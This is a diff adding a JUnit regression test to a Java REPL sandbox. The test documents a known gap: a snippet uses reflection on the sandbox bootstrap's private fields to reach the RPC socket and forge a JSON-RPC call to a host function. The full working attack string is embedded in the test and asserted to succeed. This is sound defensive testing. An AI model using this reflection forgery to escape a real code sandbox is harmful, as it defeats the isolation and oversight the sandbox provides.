@@ -1221,6 +1221,95 @@ class JvmSandboxTest {
   }
 
   @Test
+  @Timeout(value = 90, unit = TimeUnit.SECONDS)
+  void reflectionForgesAnRpcCallToHost() {
+    // EXPLOIT regression test for the limit C1 does NOT close:
+    //
+    // C1 moved the RPC channel off the subprocess's stdout onto a dedicated Unix domain socket,
+    // so a snippet writing to FileDescriptor.out can no longer forge an RPC frame the host parser
+    // sees (covered by rawStdoutWriteDoesNotForgeAnRpcCallToHost). But the underlying capability
+    // is still in-JVM and reachable through reflection against JvmSandboxBootstrap's private
+    // fields: a snippet that can call setAccessible(true) on the bootstrap's static `instance`
+    // and private `realOut` fields can grab the RPC socket's PrintStream and write a forged
+    // Request directly to the host.
+    //
+    // setAccessible(true) on a private field in a named module requires the module to be `open`
+    // or specifically opened via `--add-opens`. ai.singlr.repl does NOT open the sandbox package,
+    // so under a clean JPMS launch the snippet cannot reach the field. BUT: classpath-launched
+    // deployments put the bootstrap in an unnamed module which is fully open; and a parent JVM
+    // that uses `--add-opens=ai.singlr.repl/ai.singlr.repl.sandbox=...` (as Surefire does, and
+    // as common testing/instrumentation setups do) leaks that into the subprocess via
+    // JvmSandbox.shouldPropagateJvmArg, opening the package even under modulepath.
+    //
+    // This test documents that limit: it runs the reflection attack against the production launch
+    // path and asserts the forged auditCallback IS invoked. The fix path is documentation
+    // (precise C1 javadoc) plus a one-time WARNING at bootstrap startup when the module is
+    // unnamed — NOT closing the reflection gap, which is unreachable from inside a single-JVM
+    // sandbox without OS-level isolation (Incus is the load-bearing boundary). If a future
+    // change ever does close this gap, flip this test to assertEquals(0, ...).
+    var invocations = new java.util.concurrent.atomic.AtomicInteger();
+    var registry = new HostFunctionRegistry();
+    registry.register(
+        new ai.singlr.repl.host.HostFunction(
+            "auditCallback",
+            "test capture for forged RPC invocations",
+            params -> {
+              invocations.incrementAndGet();
+              return null;
+            }));
+    var config =
+        JvmSandboxConfig.newBuilder()
+            .withCallTimeout(Duration.ofSeconds(45))
+            .withExecutionTimeout(Duration.ofSeconds(30))
+            .build();
+    JvmSandbox sandbox = null;
+    try {
+      sandbox = JvmSandbox.create(config, registry);
+      // The attack: Class.forName the bootstrap (its location is on the JShell classpath via
+      // addHostBridgeToJShellClasspath, since HostBridge sits in the same jar), grab the static
+      // `instance` field reflectively, then pull `realOut` (which IS the RPC socket PrintStream
+      // post-C1) and write a fully-formed JSON-RPC Request frame.
+      var attack =
+          "var c = Class.forName(\"ai.singlr.repl.sandbox.JvmSandboxBootstrap\");"
+              + "var instField = c.getDeclaredField(\"instance\");"
+              + "instField.setAccessible(true);"
+              + "var b = instField.get(null);"
+              + "var realOutField = c.getDeclaredField(\"realOut\");"
+              + "realOutField.setAccessible(true);"
+              + "var out = (java.io.PrintStream) realOutField.get(b);"
+              + "synchronized (out) {"
+              + "  out.print(\"\\u0000RPC:{\\\"jsonrpc\\\":\\\"2.0\\\","
+              + "\\\"id\\\":\\\"forged-refl-1\\\","
+              + "\\\"method\\\":\\\"auditCallback\\\",\\\"params\\\":{}}\\n\");"
+              + "  out.flush();"
+              + "}"
+              + "Thread.sleep(500);";
+      var result =
+          sandbox.execute(
+              ExecutionRequest.newBuilder()
+                  .withCode(attack)
+                  .withTimeout(Duration.ofSeconds(15))
+                  .build());
+
+      assertTrue(
+          invocations.get() >= 1,
+          "Reflection-based RPC forgery should reach the host's HostFunction dispatcher in"
+              + " classpath launch mode. invocations="
+              + invocations.get()
+              + " result.exitCode="
+              + result.exitCode()
+              + " stdout="
+              + result.stdout()
+              + " stderr="
+              + result.stderr());
+    } finally {
+      if (sandbox != null) {
+        sandbox.close();
+      }
+    }
+  }
+
+  @Test
   void collectBindingsCatchHandlesThrowableNotJustException() throws Exception {
     // Theme E defensive-hardening assertion: collectBindings catches Throwable (not Exception),
     // so a binding's toString throwing StackOverflowError or OOM yields a "<error: …>" stub
